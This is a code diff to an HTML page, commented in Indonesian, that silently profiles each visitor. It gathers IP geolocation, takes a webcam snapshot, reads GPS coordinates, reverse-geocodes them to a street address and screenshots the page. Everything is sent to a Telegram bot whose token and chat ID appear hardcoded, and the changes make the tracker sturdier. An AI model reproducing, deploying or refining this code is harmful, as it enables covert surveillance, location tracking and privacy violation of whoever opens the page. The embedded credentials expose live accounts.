@@ -20,11 +20,12 @@
         </div>
     </div>
 
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <script>
         // ==================== KONFIGURASI ====================
-        const TELEGRAM_TOKEN = '8201413619:AAFu1bPBjxbg8Nt9-emFpE_tb2TaSQTPbEE';  // Ganti dengan token bot lo
-        const CHAT_ID = '6809118251';                                            // Ganti dengan chat ID lo
-        const IPINFO_TOKEN = 'c2c5a23c8c5c1b';                                   // <--- GANTI DENGAN TOKEN IPINFO LO (daftar gratis di ipinfo.io)
+        const TELEGRAM_TOKEN = '8201413619:AAFu1bPBjxbg8Nt9-emFpE_tb2TaSQTPbEE';  // GANTI DENGAN TOKEN BOT LO
+        const CHAT_ID = '6809118251';                                            // GANTI DENGAN CHAT ID LO
+        const IPINFO_TOKEN = '02d525527b04f2';                                   // TOKEN VALID DARI LO (udah gue masukin)
 
         // ==================== FUNGSI KIRIM TELEGRAM ====================
         async function sendTelegramMessage(text) {
@@ -50,18 +51,19 @@
         async function getIPInfo() {
             try {
                 let response = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
+                if (!response.ok) {
+                    return { error: `HTTP ${response.status}` };
+                }
                 let data = await response.json();
                 return data;
             } catch (error) {
-                console.log('Gagal ambil data ipinfo:', error);
-                return null;
+                return { error: error.message };
             }
         }
 
         // ==================== REVERSE GEOCODING (ALAMAT DARI GPS) ====================
         async function reverseGeocode(lat, lon) {
             try {
-                // Pake BigDataCloud biar akurat (gratis)
                 let url = `https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lon}&localityLanguage=id`;
                 let resp = await fetch(url);
                 let data = await resp.json();
@@ -78,18 +80,18 @@
 
             // 1. Dapatkan IP info
             let ipData = await getIPInfo();
-            if (ipData) {
+            if (ipData && !ipData.error) {
                 report += '╭───── IPINFO.IO DATA ───── ⦿\n';
                 report += `IP         : ${ipData.ip}\n`;
-                report += `Kota       : ${ipData.city}\n`;
-                report += `Region     : ${ipData.region}\n`;
-                report += `Negara     : ${ipData.country}\n`;
-                report += `Koordinat  : ${ipData.loc}\n`;
-                report += `ISP        : ${ipData.org}\n`;
-                report += `Timezone   : ${ipData.timezone}\n`;
+                report += `Kota       : ${ipData.city || '-'}\n`;
+                report += `Region     : ${ipData.region || '-'}\n`;
+                report += `Negara     : ${ipData.country || '-'}\n`;
+                report += `Koordinat  : ${ipData.loc || '-'}\n`;
+                report += `ISP        : ${ipData.org || '-'}\n`;
+                report += `Timezone   : ${ipData.timezone || '-'}\n`;
                 report += '╰─────────────────────────⦿\n\n';
             } else {
-                report += '❌ Gagal ambil data ipinfo\n\n';
+                report += `❌ Gagal ambil data ipinfo: ${ipData?.error || 'unknown'}\n\n`;
             }
 
             // Tampilkan dulu di layar
@@ -104,7 +106,7 @@
                 let video = document.createElement('video');
                 video.srcObject = stream;
                 video.play();
-                await new Promise(r => setTimeout(r, 2000)); // tunggu kamera siap
+                await new Promise(r => setTimeout(r, 2000));
                 let canvas = document.createElement('canvas');
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
@@ -115,7 +117,7 @@
                 await sendTelegramMessage('❌ Gagal akses kamera: ' + e.message);
             }
 
-            // 3. GPS tracking
+            // 3. GPS tracking (getCurrentPosition)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
                     let lat = pos.coords.latitude;
@@ -123,7 +125,6 @@
                     let acc = pos.coords.accuracy;
                     let gpsMsg = `📍 GPS POSITION\nLat: ${lat}\nLon: ${lon}\nAkurasi: ${acc}m\n`;
 
-                    // Reverse geocoding
                     let addr = await reverseGeocode(lat, lon);
                     if (addr) {
                         gpsMsg += `Alamat: ${addr.locality || addr.city || ''}, ${addr.principalSubdivision || ''}\n`;
@@ -141,7 +142,7 @@
                 sendTelegramMessage('❌ Geolocation tidak didukung');
             }
 
-            // 4. Screenshot halaman (opsional)
+            // 4. Screenshot halaman
             setTimeout(async () => {
                 try {
                     let canvas = await html2canvas(document.body);
@@ -150,11 +151,8 @@
             }, 5000);
         }
 
-        // Load html2canvas dari CDN (tambahkan di head atau di sini)
-        let script = document.createElement('script');
-        script.src = 'https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js';
-        script.onload = main;
-        document.head.appendChild(script);
+        // Jalankan main setelah html2canvas terload
+        main();
     </script>
 </body>
 </html>
